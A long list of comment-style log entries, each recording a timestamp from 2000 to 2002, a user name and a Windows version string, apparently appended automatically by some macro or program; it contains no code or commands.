'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:40:34
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:41:59
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:45:46
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:47:42
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:48:20
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:48:20
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:54:06
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:54:50
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:59:27
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:59:28
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:01:25
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:02:25
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:04:22
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:04:23
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:11:54
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:13:21
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:15:11
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:16:19
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:17:26
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:19:24
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:19:56
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:20:32
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:20:32
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:22:51
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:24:22
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:25:16
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:25:53
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:25:53
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:28:42
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:30:14
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:31:11
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:32:51
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 21:33:17
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 11:54:56
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 11:57:58
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 11:58:49
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 12:00:43
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 12:01:09
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 12:01:25
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 12:01:49
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 12:01:58
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 13:17:12
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 13:21:24
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 13:22:18
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 13:35:30
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 13:36:18
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:21:35
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:23:02
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:23:11
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:23:21
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:23:29
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:23:36
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:23:46
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:23:57
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:24:04
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:24:17
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:26:45
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:29:04
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:30:43
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:33:28
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:33:41
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:34:06
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:35:46
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:35:46
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:35:46
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:35:47
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:35:47
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:35:47
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:35:48
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:41:35
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:42:00
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:42:22
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:43:08
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:43:41
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:44:06
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:44:27
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:45:06
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:45:23
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:45:40
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:45:51
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:46:12
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:51:25
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:52:08
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:00
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:00
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:00
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:01
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:01
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:01
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:01
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:02
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:02
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:02
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:03
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:03
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:03
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:03
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:04
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:04
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:04
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:05
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:05
'adminis
'Windows NT 5.0 Pentium


'13.11.2000 15:53:05
'adminis
'Windows NT 5.0 Pentium


'14.11.2000 13:38:14
'adminis
'Windows NT 5.0 Pentium


'14.11.2000 13:38:41
'adminis
'Windows NT 5.0 Pentium


'14.11.2000 13:40:54
'adminis
'Windows NT 5.0 Pentium


'14.11.2000 13:40:54
'adminis
'Windows NT 5.0 Pentium


'14.11.2000 15:49:15
'trc
'Windows NT 5.0 Pentium


'14.11.2000 15:50:18
'trc
'Windows NT 5.0 Pentium


'14.11.2000 15:58:42
'trc
'Windows NT 5.0 Pentium


'14.11.2000 16:00:25
'trc
'Windows NT 5.0 Pentium


'14.11.2000 18:38:33
'kin
'Windows NT 5.0 Pentium


'15.11.2000 13:51:23
'adminis
'Windows NT 5.0 Pentium


'15.11.2000 16:25:08
'adminis
'Windows NT 5.0 Pentium


'15.11.2000 20:01:50
'adminis
'Windows NT 5.0 Pentium


'15.11.2000 20:01:50
'adminis
'Windows NT 5.0 Pentium


'15.11.2000 20:01:50
'adminis
'Windows NT 5.0 Pentium


'15.11.2000 20:01:51
'adminis
'Windows NT 5.0 Pentium


'15.11.2000 20:01:51
'adminis
'Windows NT 5.0 Pentium


'15.11.2000 20:01:52
'adminis
'Windows NT 5.0 Pentium


'15.11.2000 20:01:52
'adminis
'Windows NT 5.0 Pentium


'16.11.2000 14:50:58
'adminis
'Windows NT 5.0 Pentium


'16.11.2000 15:19:48
'adminis
'Windows NT 5.0 Pentium


'16.11.2000 16:21:02
'adminis
'Windows NT 5.0 Pentium


'18.11.2000 13:48:06
'adminis
'Windows NT 5.0 Pentium


'18.11.2000 13:48:10
'adminis
'Windows NT 5.0 Pentium


'18.11.2000 20:51:33
'adminis
'Windows NT 5.0 Pentium


'06.12.2001 16:20:57
'adminis
'Windows NT 5.0 Pentium


'16.12.2001 13:04:20
'trc
'Windows 4.90 Pentium


'19.12.2001 13:35:37
'adminis
'Windows NT 5.0 Pentium


'19.12.2001 17:22:42
'adminis
'Windows NT 5.0 Pentium


'19.12.2001 17:22:53
'adminis
'Windows NT 5.0 Pentium


'19.12.2001 17:25:21
'adminis
'Windows NT 5.0 Pentium


'21.12.2001 12:19:15
'adminis
'Windows NT 5.0 Pentium


'23.12.2001 21:43:52
'adminis
'Windows NT 5.0 Pentium


'25.12.2001 14:39:54
'adminis
'Windows NT 5.0 Pentium


'25.12.2001 14:40:32
'adminis
'Windows NT 5.0 Pentium


'25.12.2001 14:40:59
'adminis
'Windows NT 5.0 Pentium


'25.12.2001 14:41:18
'adminis
'Windows NT 5.0 Pentium


'25.12.2001 16:48:46
'adminis
'Windows NT 5.0 Pentium


'28.12.2001 14:10:37
'adminis
'Windows NT 5.0 Pentium


'28.12.2001 14:11:38
'adminis
'Windows NT 5.0 Pentium


'28.12.2001 14:14:32
'adminis
'Windows NT 5.0 Pentium


'28.12.2001 16:42:47
'adminis
'Windows NT 5.0 Pentium


'29.12.2001 17:49:01
'adminis
'Windows NT 5.0 Pentium


'31.12.2001 10:28:53
'adminis
'Windows NT 5.0 Pentium


'31.12.2001 14:19:35
'adminis
'Windows NT 5.0 Pentium


'31.12.2001 14:21:04
'adminis
'Windows NT 5.0 Pentium


'31.12.2001 14:22:28
'adminis
'Windows NT 5.0 Pentium


'31.12.2001 14:23:29
'adminis
'Windows NT 5.0 Pentium


'31.12.2001 14:25:34
'adminis
'Windows NT 5.0 Pentium


'31.12.2001 15:39:11
'adminis
'Windows NT 5.0 Pentium


'06.01.2002 17:40:39
'adminis
'Windows NT 5.0 Pentium


'06.01.2002 19:06:43
'adminis
'Windows NT 5.0 Pentium


'06.01.2002 19:39:31
'adminis
'Windows NT 5.0 Pentium


'06.01.2002 19:42:39
'adminis
'Windows NT 5.0 Pentium


'07.01.02 12:01:22
'Viktor
'Windows 4.10 Pentium


'07.01.02 12:01:29
'Viktor
'Windows 4.10 Pentium


'07.01.02 12:03:44
'Viktor
'Windows 4.10 Pentium


'07.01.02 12:10:53
'Viktor
'Windows 4.10 Pentium


'07.01.02 12:26:34
'Viktor
'Windows 4.10 Pentium


'07.01.02 12:34:58
'Viktor
'Windows 4.10 Pentium


'07.01.02 12:36:37
'Viktor
'Windows 4.10 Pentium


'07.01.02 12:46:16
'Viktor
'Windows 4.10 Pentium


'07.01.02 18:59:18
'Viktor
'Windows 4.10 Pentium


'07.01.02 19:08:46
'Viktor
'Windows 4.10 Pentium


'07.01.02 20:50:45
'Viktor
'Windows 4.10 Pentium


'07.01.02 20:52:09
'Viktor
'Windows 4.10 Pentium


'08.01.02 10:43:03
'Viktor
'Windows 4.10 Pentium


'08.01.02 12:30:58
'Viktor
'Windows 4.10 Pentium


'08.01.02 17:27:20
'Viktor
'Windows 4.10 Pentium


'08.01.02 19:02:26
'Viktor
'Windows 4.10 Pentium


'09.01.02 13:50:31
'Viktor
'Windows 4.10 Pentium


'09.01.02 13:52:46
'Viktor
'Windows 4.10 Pentium


'09.01.02 13:53:48
'Viktor
'Windows 4.10 Pentium


'09.01.02 13:54:57
'Viktor
'Windows 4.10 Pentium


'09.01.02 14:00:12
'Viktor
'Windows 4.10 Pentium


'10.01.02 11:50:45
'Viktor
'Windows 4.10 Pentium


'10.01.02 11:56:08
'Viktor
'Windows 4.10 Pentium


'10.01.02 11:59:36
'Viktor
'Windows 4.10 Pentium


'10.01.02 12:24:20
'Viktor
'Windows 4.10 Pentium


'10.01.02 13:27:39
'Viktor
'Windows 4.10 Pentium


'10.01.02 13:29:29
'Viktor
'Windows 4.10 Pentium


'11.01.02 12:10:34
'Viktor
'Windows 4.10 Pentium


'11.01.02 17:24:25
'Viktor
'Windows 4.10 Pentium


'11.01.02 19:41:02
'Viktor
'Windows 4.10 Pentium


'11.01.02 19:41:19
'Viktor
'Windows 4.10 Pentium


'12.01.02 16:57:49
'tesi
'Windows 4.10 Pentium


'12.01.02 18:03:57
'tesi
'Windows 4.10 Pentium


'12.01.02 18:04:25
'tesi
'Windows 4.10 Pentium


'12.01.02 18:04:38
'tesi
'Windows 4.10 Pentium


'12.01.02 18:05:26
'tesi
'Windows 4.10 Pentium


'12.01.02 18:05:43
'tesi
'Windows 4.10 Pentium


'12.01.02 18:06:02
'tesi
'Windows 4.10 Pentium


'12.01.02 18:06:48
'tesi
'Windows 4.10 Pentium


'12.01.02 18:09:57
'tesi
'Windows 4.10 Pentium


'12.01.02 19:28:27
'tesi
'Windows 4.10 Pentium


'12.01.02 19:29:56
'tesi
'Windows 4.10 Pentium


'12.01.02 19:32:52
'tesi
'Windows 4.10 Pentium


'12.01.02 20:10:59
'tesi
'Windows 4.10 Pentium


'13.01.02 13:49:32
'tesi
'Windows 4.10 Pentium


'13.01.02 13:52:24
'tesi
'Windows 4.10 Pentium


'13.01.02 16:40:44
'tesi
'Windows 4.10 Pentium


'13.01.02 17:12:53
'tesi
'Windows 4.10 Pentium


'13.01.02 18:08:28
'tesi
'Windows 4.10 Pentium


'13.01.02 18:31:00
'tesi
'Windows 4.10 Pentium


'13.01.02 18:48:52
'tesi
'Windows 4.10 Pentium


'13.01.02 19:08:19
'tesi
'Windows 4.10 Pentium


'14.01.02 14:56:46
'tesi
'Windows 4.10 Pentium


'14.01.02 15:01:00
'tesi
'Windows 4.10 Pentium


'14.01.02 15:40:08
'tesi
'Windows 4.10 Pentium


'14.01.02 15:43:46
'tesi
'Windows 4.10 Pentium


'14.01.02 15:56:15
'tesi
'Windows 4.10 Pentium


'14.01.02 20:29:41
'tesi
'Windows 4.10 Pentium


'14.01.02 21:04:09
'tesi
'Windows 4.10 Pentium


'14.01.02 21:06:05
'tesi
'Windows 4.10 Pentium


'15.01.02 9:21:54
'tesi
'Windows 4.10 Pentium


'15.01.02 9:25:15
'tesi
'Windows 4.10 Pentium


'15.01.02 9:26:04
'tesi
'Windows 4.10 Pentium


'15.01.02 9:27:32
'tesi
'Windows 4.10 Pentium


'15.01.02 9:28:33
'tesi
'Windows 4.10 Pentium


'15.01.02 11:53:08
'tesi
'Windows 4.10 Pentium


'15.01.02 12:43:05
'tesi
'Windows 4.10 Pentium


'15.01.02 13:18:17
'tesi
'Windows 4.10 Pentium


'16.01.02 16:11:03
'TESI14
'Windows 4.10 Pentium


'16.01.02 18:19:57
'TESI14
'Windows 4.10 Pentium


'16.01.02 18:52:57
'TESI14
'Windows 4.10 Pentium


'16.01.02 20:31:57
'TESI14
'Windows 4.10 Pentium


'17.01.02 7:51:40
'TESI14
'Windows 4.10 Pentium


'17.01.02 8:13:53
'TESI14
'Windows 4.10 Pentium


'17.01.02 8:36:13
'TESI14
'Windows 4.10 Pentium


'17.01.02 8:43:02
'TESI14
'Windows 4.10 Pentium


'17.01.02 12:07:27
'TESI14
'Windows 4.10 Pentium


'17.01.02 12:07:40
'TESI14
'Windows 4.10 Pentium


'17.01.02 13:11:09
'TESI14
'Windows 4.10 Pentium


'17.01.02 13:18:42
'TESI14
'Windows 4.10 Pentium


'17.01.02 13:24:23
'TESI14
'Windows 4.10 Pentium


'17.01.02 14:00:55
'TESI14
'Windows 4.10 Pentium


'17.01.02 14:01:34
'TESI14
'Windows 4.10 Pentium


'17.01.02 14:05:14
'TESI14
'Windows 4.10 Pentium


'17.01.02 14:05:39
'TESI14
'Windows 4.10 Pentium


'17.01.02 14:08:03
'TESI14
'Windows 4.10 Pentium


'17.01.02 14:51:36
'TESI14
'Windows 4.10 Pentium


'17.01.02 14:54:25
'TESI14
'Windows 4.10 Pentium


'17.01.02 15:04:58
'TESI14
'Windows 4.10 Pentium


'17.01.02 15:05:26
'TESI14
'Windows 4.10 Pentium


'17.01.02 15:05:39
'TESI14
'Windows 4.10 Pentium


'17.01.02 16:44:59
'TESI14
'Windows 4.10 Pentium


'17.01.02 16:49:12
'TESI14
'Windows 4.10 Pentium


'17.01.02 16:51:50
'TESI14
'Windows 4.10 Pentium


'17.01.02 18:36:24
'TESI14
'Windows 4.10 Pentium


'17.01.02 20:42:33
'TESI14
'Windows 4.10 Pentium


'17.01.02 20:46:20
'TESI14
'Windows 4.10 Pentium


'18.01.02 9:09:47
'TESI14
'Windows 4.10 Pentium


'18.01.02 13:50:41
'TESI14
'Windows 4.10 Pentium


'18.01.02 15:15:31
'TESI14
'Windows 4.10 Pentium


'18.01.02 15:22:16
'TESI14
'Windows 4.10 Pentium


'18.01.02 15:24:04
'TESI14
'Windows 4.10 Pentium


'18.01.02 17:43:38
'TESI14
'Windows 4.10 Pentium


'19.01.02 16:23:04
'TESI14
'Windows 4.10 Pentium


'19.01.02 16:23:46
'TESI14
'Windows 4.10 Pentium


'19.01.02 17:21:05
'TESI14
'Windows 4.10 Pentium


'19.01.02 17:30:07
'TESI14
'Windows 4.10 Pentium


'19.01.02 17:49:20
'TESI14
'Windows 4.10 Pentium


'19.01.02 17:49:36
'TESI14
'Windows 4.10 Pentium


'20.01.02 9:59:45
'TESI14
'Windows 4.10 Pentium


'20.01.02 10:22:32
'TESI14
'Windows 4.10 Pentium


'20.01.02 12:38:35
'TESI14
'Windows 4.10 Pentium


'20.01.02 17:50:39
'TESI14
'Windows 4.10 Pentium


'20.01.02 18:05:02
'TESI14
'Windows 4.10 Pentium


'21.01.02 12:57:51
'TESI14
'Windows 4.10 Pentium


'21.01.02 13:36:21
'TESI14
'Windows 4.10 Pentium


'21.01.02 14:08:39
'TESI14
'Windows 4.10 Pentium


'21.01.02 16:18:41
'TESI14
'Windows 4.10 Pentium


'21.01.02 16:18:52
'TESI14
'Windows 4.10 Pentium


'21.01.02 16:30:41
'TESI14
'Windows 4.10 Pentium


'21.01.02 17:03:19
'TESI14
'Windows 4.10 Pentium


'21.01.02 17:03:28
'TESI14
'Windows 4.10 Pentium


'21.01.02 17:36:00
'TESI14
'Windows 4.10 Pentium


'21.01.02 18:12:00
'TESI14
'Windows 4.10 Pentium


'21.01.02 19:50:18
'TESI14
'Windows 4.10 Pentium


'22.01.02 8:29:04
'TESI14
'Windows 4.10 Pentium


'22.01.02 8:29:37
'TESI14
'Windows 4.10 Pentium


'22.01.02 13:32:46
'TESI14
'Windows 4.10 Pentium


'22.01.02 13:38:40
'TESI14
'Windows 4.10 Pentium


'22.01.02 15:25:28
'TESI14
'Windows 4.10 Pentium


'22.01.02 15:26:45
'TESI14
'Windows 4.10 Pentium


'23.01.02 9:41:30
'TESI14
'Windows 4.10 Pentium


'23.01.02 9:47:45
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:23:19
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:23:58
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:24:07
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:24:24
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:29:56
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:30:28
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:30:48
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:30:57
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:31:55
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:33:05
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:33:20
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:33:38
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:34:42
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:42:17
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:42:37
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:42:51
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:42:59
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:43:07
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:43:16
'TESI14
'Windows 4.10 Pentium


'23.01.02 13:56:03
'TESI14
'Windows 4.10 Pentium


'23.01.02 14:18:16
'TESI14
'Windows 4.10 Pentium


'23.01.02 14:19:00
'TESI14
'Windows 4.10 Pentium


'23.01.02 14:19:27
'TESI14
'Windows 4.10 Pentium


'23.01.02 14:20:41
'TESI14
'Windows 4.10 Pentium


'23.01.02 14:56:51
'TESI14
'Windows 4.10 Pentium


'23.01.02 16:21:10
'TESI14
'Windows 4.10 Pentium


'23.01.02 16:45:32
'TESI14
'Windows 4.10 Pentium


'23.01.02 17:53:36
'TESI14
'Windows 4.10 Pentium


'23.01.02 18:02:17
'TESI14
'Windows 4.10 Pentium


'23.01.02 18:02:52
'TESI14
'Windows 4.10 Pentium


'23.01.02 20:46:39
'TESI14
'Windows 4.10 Pentium


'24.01.02 11:39:42
'TESI14
'Windows 4.10 Pentium


'24.01.02 16:59:56
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:00:01
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:00:42
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:00:57
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:01:11
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:01:35
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:01:47
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:01:55
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:02:12
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:02:39
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:04:33
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:35:19
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:38:02
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:41:05
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:41:46
'TESI14
'Windows 4.10 Pentium


'24.01.02 17:46:44
'TESI14
'Windows 4.10 Pentium


'24.01.02 22:24:14
'TESI14
'Windows 4.10 Pentium


'25.01.02 13:39:58
'TESI14
'Windows 4.10 Pentium


'25.01.02 13:58:21
'TESI14
'Windows 4.10 Pentium


'25.01.02 14:00:12
'TESI14
'Windows 4.10 Pentium


'25.01.02 14:48:38
'TESI14
'Windows 4.10 Pentium


'25.01.02 16:27:53
'TESI14
'Windows 4.10 Pentium


'25.01.02 17:08:50
'TESI14
'Windows 4.10 Pentium


'25.01.02 17:38:06
'TESI14
'Windows 4.10 Pentium


'25.01.02 17:51:14
'TESI14
'Windows 4.10 Pentium


'25.01.02 17:53:50
'TESI14
'Windows 4.10 Pentium


'25.01.02 17:57:05
'TESI14
'Windows 4.10 Pentium


'25.01.02 17:58:58
'TESI14
'Windows 4.10 Pentium


'25.01.02 19:09:26
'TESI14
'Windows 4.10 Pentium


'25.01.02 19:57:55
'TESI14
'Windows 4.10 Pentium


'25.01.02 19:58:42
'TESI14
'Windows 4.10 Pentium


'25.01.02 20:13:40
'TESI14
'Windows 4.10 Pentium


'25.01.02 20:26:29
'TESI14
'Windows 4.10 Pentium


'25.01.02 20:27:47
'TESI14
'Windows 4.10 Pentium


'25.01.02 20:34:31
'TESI14
'Windows 4.10 Pentium


'25.01.02 20:46:43
'TESI14
'Windows 4.10 Pentium


'25.01.02 21:56:34
'TESI14
'Windows 4.10 Pentium


'25.01.02 21:57:06
'TESI14
'Windows 4.10 Pentium


'25.01.02 22:16:36
'TESI14
'Windows 4.10 Pentium


'25.01.02 22:17:46
'TESI14
'Windows 4.10 Pentium


'26.01.02 8:08:00
'TESI14
'Windows 4.10 Pentium


'26.01.02 8:20:23
'TESI14
'Windows 4.10 Pentium


'26.01.02 8:37:48
'TESI14
'Windows 4.10 Pentium


'26.01.02 14:54:49
'TESI14
'Windows 4.10 Pentium


'26.01.02 14:58:00
'TESI14
'Windows 4.10 Pentium


'26.01.02 15:06:25
'TESI14
'Windows 4.10 Pentium


'26.01.02 17:50:10
'TESI14
'Windows 4.10 Pentium


'26.01.02 17:52:36
'TESI14
'Windows 4.10 Pentium


'26.01.02 18:44:49
'TESI14
'Windows 4.10 Pentium


'26.01.02 18:51:35
'TESI14
'Windows 4.10 Pentium


'27.01.2002 7:44:33
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 7:53:57
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 7:54:32
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 7:58:26
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 7:59:09
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 7:59:16
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 7:59:57
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:00:21
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:00:50
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:01:05
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:01:35
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:01:47
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:01:55
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:02:10
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:02:23
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:02:33
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:03:06
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:03:21
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:03:36
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:03:38
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:04:07
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:04:21
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:04:41
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:04:50
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 8:04:58
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 10:50:50
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 12:08:04
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 12:18:30
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 12:32:27
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 12:38:28
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 13:01:21
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 17:29:19
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:12:18
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:14:59
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:15:01
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:19:04
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:21:18
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:21:20
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:25:14
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:25:49
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:27:43
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:40:55
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:40:57
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:42:37
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:43:13
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:43:15
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:43:49
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:44:01
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:53:41
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 18:53:43
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 20:09:54
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 20:09:59
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 20:25:23
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 20:44:49
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 20:55:49
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 22:26:18
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 22:26:20
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 22:26:48
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 22:26:50
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 22:28:01
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 22:39:35
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 22:39:37
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 22:39:53
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 22:39:55
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 22:40:21
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 22:58:24
'Donskoi
'Windows NT 5.0 Pentium


'27.01.2002 22:58:26
'Donskoi
